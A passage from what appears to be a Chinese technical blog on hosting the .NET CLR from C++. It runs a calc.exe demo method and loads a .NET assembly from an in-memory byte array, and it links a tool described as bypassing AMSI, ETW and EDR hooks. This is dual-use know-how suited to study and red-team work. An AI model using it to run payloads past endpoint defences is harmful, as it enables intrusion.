	iRuntimeInfo<span class="token operator">-&gt;</span><span class="token function">GetInterface</span><span class="token punctuation">(</span>CLSID_CorRuntimeHost<span class="token punctuation">,</span> IID_ICorRuntimeHost<span class="token punctuation">,</span> <span class="token punctuation">(</span>VOID<span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>iRuntimeHost<span class="token punctuation">)</span><span class="token punctuation">;</span>
	iRuntimeHost<span class="token operator">-&gt;</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	hr <span class="token operator">=</span> pRuntimeHost<span class="token operator">-&gt;</span><span class="token function">ExecuteInDefaultAppDomain</span><span class="token punctuation">(</span>L<span class="token string">&quot;xxx.exe&quot;</span><span class="token punctuation">,</span>
		L<span class="token string">&quot;namespace.class&quot;</span><span class="token punctuation">,</span><span class="token comment">//类全名</span>
		L<span class="token string">&quot;bbb&quot;</span><span class="token punctuation">,</span><span class="token comment">// 方法名</span>
		L<span class="token string">&quot;HELLO!&quot;</span><span class="token punctuation">,</span><span class="token comment">// 参数  // 此处不知道咋能不输入参数，？</span>
		<span class="token operator">&amp;</span>dwRet<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="示例代码" tabindex="-1"><a class="header-anchor" href="#示例代码"><span>示例代码</span></a></h4><p><strong>unmanaged.cpp</strong></p><div class="language-cpp line-numbers-mode" data-ext="cpp" data-title="cpp"><pre class="language-cpp"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;SDKDDKVer.h&gt;</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;tchar.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h&gt;</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;metahost.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;mscoree.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">comment</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span> </span><span class="token string">&quot;mscoree.lib&quot;</span><span class="token expression"><span class="token punctuation">)</span></span></span>

<span class="token keyword">int</span> <span class="token function">_tmain</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> _TCHAR<span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	ICLRMetaHost<span class="token operator">*</span> pMetaHost <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
	ICLRMetaHostPolicy<span class="token operator">*</span> pMetaHostPolicy <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
	ICLRRuntimeHost<span class="token operator">*</span> pRuntimeHost <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
	ICLRRuntimeInfo<span class="token operator">*</span> pRuntimeInfo <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>

	HRESULT hr <span class="token operator">=</span> <span class="token function">CLRCreateInstance</span><span class="token punctuation">(</span>CLSID_CLRMetaHost<span class="token punctuation">,</span> IID_ICLRMetaHost<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPVOID<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>pMetaHost<span class="token punctuation">)</span><span class="token punctuation">;</span>
	hr <span class="token operator">=</span> pMetaHost<span class="token operator">-&gt;</span><span class="token function">GetRuntime</span><span class="token punctuation">(</span>L<span class="token string">&quot;v4.0.30319&quot;</span><span class="token punctuation">,</span> <span class="token function">IID_PPV_ARGS</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pRuntimeInfo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	DWORD dwRet <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">FAILED</span><span class="token punctuation">(</span>hr<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">goto</span> cleanup<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	hr <span class="token operator">=</span> pRuntimeInfo<span class="token operator">-&gt;</span><span class="token function">GetInterface</span><span class="token punctuation">(</span>CLSID_CLRRuntimeHost<span class="token punctuation">,</span> <span class="token function">IID_PPV_ARGS</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pRuntimeHost<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	hr <span class="token operator">=</span> pRuntimeHost<span class="token operator">-&gt;</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 此处不知道咋能不输入参数，没输入就不行？</span>
	hr <span class="token operator">=</span> pRuntimeHost<span class="token operator">-&gt;</span><span class="token function">ExecuteInDefaultAppDomain</span><span class="token punctuation">(</span>L<span class="token string">&quot;loadCalc.exe&quot;</span><span class="token punctuation">,</span>
		L<span class="token string">&quot;loadCalc.Program&quot;</span><span class="token punctuation">,</span>
		L<span class="token string">&quot;bbb&quot;</span><span class="token punctuation">,</span>
		L<span class="token string">&quot;HELLO!&quot;</span><span class="token punctuation">,</span>
		<span class="token operator">&amp;</span>dwRet<span class="token punctuation">)</span><span class="token punctuation">;</span>
	hr <span class="token operator">=</span> pRuntimeHost<span class="token operator">-&gt;</span><span class="token function">Stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

cleanup<span class="token operator">:</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pRuntimeInfo <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		pRuntimeInfo<span class="token operator">-&gt;</span><span class="token function">Release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		pRuntimeInfo <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>pRuntimeHost <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		pRuntimeHost<span class="token operator">-&gt;</span><span class="token function">Release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		pRuntimeHost <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>pMetaHost <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		pMetaHost<span class="token operator">-&gt;</span><span class="token function">Release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		pMetaHost <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行的C#源码</p><div class="language-csharp line-numbers-mode" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>

<span class="token keyword">namespace</span> <span class="token namespace">loadCalc</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Program</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">&quot;Hello World!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">bbb</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> s<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>Process</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>Process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">&quot;c:\\\\windows\\\\system32\\\\calc.exe&quot;</span><span class="token punctuation">;</span>
            p<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>效果</p><figure><img src="`+d+'" alt="image-20241210102855805" tabindex="0" loading="lazy"><figcaption>image-20241210102855805</figcaption></figure><h3 id="_2-4-内存加载执行-net程序集" tabindex="-1"><a class="header-anchor" href="#_2-4-内存加载执行-net程序集"><span>2.4. 内存加载执行.NET程序集</span></a></h3>',9)),s("blockquote",null,[s("p",null,[s("a",I,[n[14]||(n[14]=a("med0x2e/ExecuteAssembly: Load/Inject .NET assemblies by; reusing the host (spawnto) process loaded CLR AppDomainManager, Stomping Loader/.NET assembly PE DOS headers, Unlinking .NET related modules, bypassing ETW+AMSI, avoiding EDR hooks via NT static syscalls (x64) and hiding imports by dynamically resolving APIs (hash).")),p(t)])])]),n[21]||(n[21]=e(`<h4 id="过程-1" tabindex="-1"><a class="header-anchor" href="#过程-1"><span>过程</span></a></h4><ol><li><p>初始化CLR环境(同上)</p></li><li><p>通过ICLRRuntimeHost获取AppDomain接口指针，然后通过AppDomain接口的QueryInterface方法来查询默认应用程序域的实例指针。</p></li></ol><div class="language-cpp line-numbers-mode" data-ext="cpp" data-title="cpp"><pre class="language-cpp"><code>	iRuntimeHost<span class="token operator">-&gt;</span><span class="token function">GetDefaultDomain</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pAppDomain<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pAppDomain<span class="token operator">-&gt;</span><span class="token function">QueryInterface</span><span class="token punctuation">(</span><span class="token function">__uuidof</span><span class="token punctuation">(</span>_AppDomain<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>VOID<span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>pDefaultAppDomain<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ol start="3"><li>通过默认应用程序域实例的Load_3方法加载安全.net程序集数组，并返回Assembly的实例对象指针，通过Assembly实例对象的get_EntryPoint方法获取描述入口点的MethodInfo实例对象。</li></ol><div class="language-cpp line-numbers-mode" data-ext="cpp" data-title="cpp"><pre class="language-cpp"><code>	saBound<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cElements <span class="token operator">=</span> ASSEMBLY_LENGTH<span class="token punctuation">;</span>
	saBound<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lLbound <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	SAFEARRAY<span class="token operator">*</span> pSafeArray <span class="token operator">=</span> <span class="token function">SafeArrayCreate</span><span class="token punctuation">(</span>VT_UI1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> saBound<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">SafeArrayAccessData</span><span class="token punctuation">(</span>pSafeArray<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span>pData<span class="token punctuation">,</span> dotnetRaw<span class="token punctuation">,</span> ASSEMBLY_LENGTH<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">SafeArrayUnaccessData</span><span class="token punctuation">(</span>pSafeArray<span class="token punctuation">)</span><span class="token punctuation">;</span>

	pDefaultAppDomain<span class="token operator">-&gt;</span><span class="token function">Load_3</span><span class="token punctuation">(</span>pSafeArray<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pAssembly<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pAssembly<span class="token operator">-&gt;</span><span class="token function">get_EntryPoint</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pMethodInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="4"><li>创建参数安全数组</li></ol><div class="language-cpp line-numbers-mode" data-ext="cpp" data-title="cpp"><pre class="language-cpp"><code><span class="token function">ZeroMemory</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>vRet<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>VARIANT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">ZeroMemory</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>vObj<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>VARIANT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	vObj<span class="token punctuation">.</span>vt <span class="token operator">=</span> VT_NULL<span class="token punctuation">;</span>

	vPsa<span class="token punctuation">.</span>vt <span class="token operator">=</span> <span class="token punctuation">(</span>VT_ARRAY <span class="token operator">|</span> VT_BSTR<span class="token punctuation">)</span><span class="token punctuation">;</span>
	args <span class="token operator">=</span> <span class="token function">SafeArrayCreateVector</span><span class="token punctuation">(</span>VT_VARIANT<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		vPsa<span class="token punctuation">.</span>parray <span class="token operator">=</span> <span class="token function">SafeArrayCreateVector</span><span class="token punctuation">(</span>VT_BSTR<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> argc<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">long</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">SafeArrayPutElement</span><span class="token punctuation">(</span>vPsa<span class="token punctuation">.</span>parray<span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">,</span> <span class="token function">SysAllocString</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token keyword">long</span> idx<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
		<span class="token function">SafeArrayPutElement</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> idx<span class="token punctuation">,</span> <span class="token operator">&amp;</span>vPsa<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="5"><li>通过描述入口点的MethodInfo实例对象的Invoke方法执行入口点。</li></ol><div class="language-cpp line-numbers-mode" data-ext="cpp" data-title="cpp"><pre class="language-cpp"><code>HRESULT hr <span class="token operator">=</span> pMethodInfo<span class="token operator">-&gt;</span><span class="token function">Invoke_3</span><span class="token punctuation">(</span>vObj<span class="token punctuation">,</span> args<span class="token punctuation">,</span> <span class="token operator">&amp;</span>vRet<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="示例代码-1" tabindex="-1"><a class="header-anchor" href="#示例代码-1"><span>示例代码</span></a></h4><div class="language-cpp line-numbers-mode" data-ext="cpp" data-title="cpp"><pre class="language-cpp"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;tchar.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;metahost.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">comment</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span> </span><span class="token string">&quot;mscoree.lib&quot;</span><span class="token expression"><span class="token punctuation">)</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">import</span> <span class="token expression"><span class="token operator">&lt;</span>mscorlib<span class="token punctuation">.</span>tlb<span class="token operator">&gt;</span> raw_interfaces_only			</span><span class="token punctuation">\\</span>
    	<span class="token expression"><span class="token function">high_property_prefixes</span><span class="token punctuation">(</span></span><span class="token string">&quot;_get&quot;</span><span class="token expression"><span class="token punctuation">,</span></span><span class="token string">&quot;_put&quot;</span><span class="token expression"><span class="token punctuation">,</span></span><span class="token string">&quot;_putref&quot;</span><span class="token expression"><span class="token punctuation">)</span>		</span><span class="token punctuation">\\</span>
    	<span class="token expression"><span class="token function">rename</span><span class="token punctuation">(</span></span><span class="token string">&quot;ReportEvent&quot;</span><span class="token expression"><span class="token punctuation">,</span> </span><span class="token string">&quot;InteropServices_ReportEvent&quot;</span><span class="token expression"><span class="token punctuation">)</span>	</span><span class="token punctuation">\\</span>
	<span class="token expression"><span class="token function">rename</span><span class="token punctuation">(</span></span><span class="token string">&quot;or&quot;</span><span class="token expression"><span class="token punctuation">,</span> </span><span class="token string">&quot;InteropServices_or&quot;</span><span class="token expression"><span class="token punctuation">)</span></span></span>

<span class="token keyword">using</span> <span class="token keyword">namespace</span> mscorlib<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ASSEMBLY_LENGTH</span>  <span class="token expression"><span class="token number">8192</span></span></span>


<span class="token keyword">unsigned</span> <span class="token keyword">char</span> dotnetRaw<span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span> <span class="token operator">=</span>
<span class="token string">&quot;\\x4d\\x5a\\x90\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\xff\\xff\\x00...&quot;</span><span class="token punctuation">;</span><span class="token comment">//.net程序集字节数组</span>



<span class="token keyword">int</span> <span class="token function">_tmain</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> _TCHAR<span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

	ICLRMetaHost<span class="token operator">*</span> iMetaHost <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	ICLRRuntimeInfo<span class="token operator">*</span> iRuntimeInfo <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	ICorRuntimeHost<span class="token operator">*</span> iRuntimeHost <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	IUnknownPtr pAppDomain <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	_AppDomainPtr pDefaultAppDomain <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	_AssemblyPtr pAssembly <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	_MethodInfoPtr pMethodInfo <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	SAFEARRAYBOUND saBound<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">void</span><span class="token operator">*</span> pData <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	VARIANT vRet<span class="token punctuation">;</span>
	VARIANT vObj<span class="token punctuation">;</span>
	VARIANT vPsa<span class="token punctuation">;</span>
	SAFEARRAY<span class="token operator">*</span> args <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token function">CLRCreateInstance</span><span class="token punctuation">(</span>CLSID_CLRMetaHost<span class="token punctuation">,</span> IID_ICLRMetaHost<span class="token punctuation">,</span> <span class="token punctuation">(</span>VOID<span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>iMetaHost<span class="token punctuation">)</span><span class="token punctuation">;</span>
	iMetaHost<span class="token operator">-&gt;</span><span class="token function">GetRuntime</span><span class="token punctuation">(</span>L<span class="token string">&quot;v4.0.30319&quot;</span><span class="token punctuation">,</span> IID_ICLRRuntimeInfo<span class="token punctuation">,</span> <span class="token punctuation">(</span>VOID<span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>iRuntimeInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
	iRuntimeInfo<span class="token operator">-&gt;</span><span class="token function">GetInterface</span><span class="token punctuation">(</span>CLSID_CorRuntimeHost<span class="token punctuation">,</span> IID_ICorRuntimeHost<span class="token punctuation">,</span> <span class="token punctuation">(</span>VOID<span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>iRuntimeHost<span class="token punctuation">)</span><span class="token punctuation">;</span>
	iRuntimeHost<span class="token operator">-&gt;</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


	iRuntimeHost<span class="token operator">-&gt;</span><span class="token function">GetDefaultDomain</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pAppDomain<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pAppDomain<span class="token operator">-&gt;</span><span class="token function">QueryInterface</span><span class="token punctuation">(</span><span class="token function">__uuidof</span><span class="token punctuation">(</span>_AppDomain<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>VOID<span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>pDefaultAppDomain<span class="token punctuation">)</span><span class="token punctuation">;</span>

	saBound<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cElements <span class="token operator">=</span> ASSEMBLY_LENGTH<span class="token punctuation">;</span>
	saBound<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lLbound <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	SAFEARRAY<span class="token operator">*</span> pSafeArray <span class="token operator">=</span> <span class="token function">SafeArrayCreate</span><span class="token punctuation">(</span>VT_UI1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> saBound<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">SafeArrayAccessData</span><span class="token punctuation">(</span>pSafeArray<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span>pData<span class="token punctuation">,</span> dotnetRaw<span class="token punctuation">,</span> ASSEMBLY_LENGTH<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">SafeArrayUnaccessData</span><span class="token punctuation">(</span>pSafeArray<span class="token punctuation">)</span><span class="token punctuation">;</span>

	pDefaultAppDomain<span class="token operator">-&gt;</span><span class="token function">Load_3</span><span class="token punctuation">(</span>pSafeArray<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pAssembly<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pAssembly<span class="token operator">-&gt;</span><span class="token function">get_EntryPoint</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pMethodInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">ZeroMemory</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>vRet<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>VARIANT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">ZeroMemory</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>vObj<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>VARIANT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	vObj<span class="token punctuation">.</span>vt <span class="token operator">=</span> VT_NULL<span class="token punctuation">;</span>



	vPsa<span class="token punctuation">.</span>vt <span class="token operator">=</span> <span class="token punctuation">(</span>VT_ARRAY <span class="token operator">|</span> VT_BSTR<span class="token punctuation">)</span><span class="token punctuation">;</span>
	args <span class="token operator">=</span> <span class="token function">SafeArrayCreateVector</span><span class="token punctuation">(</span>VT_VARIANT<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		vPsa<span class="token punctuation">.</span>parray <span class="token operator">=</span> <span class="token function">SafeArrayCreateVector</span><span class="token punctuation">(</span>VT_BSTR<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> argc<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">long</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">SafeArrayPutElement</span><span class="token punctuation">(</span>vPsa<span class="token punctuation">.</span>parray<span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">,</span> <span class="token function">SysAllocString</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

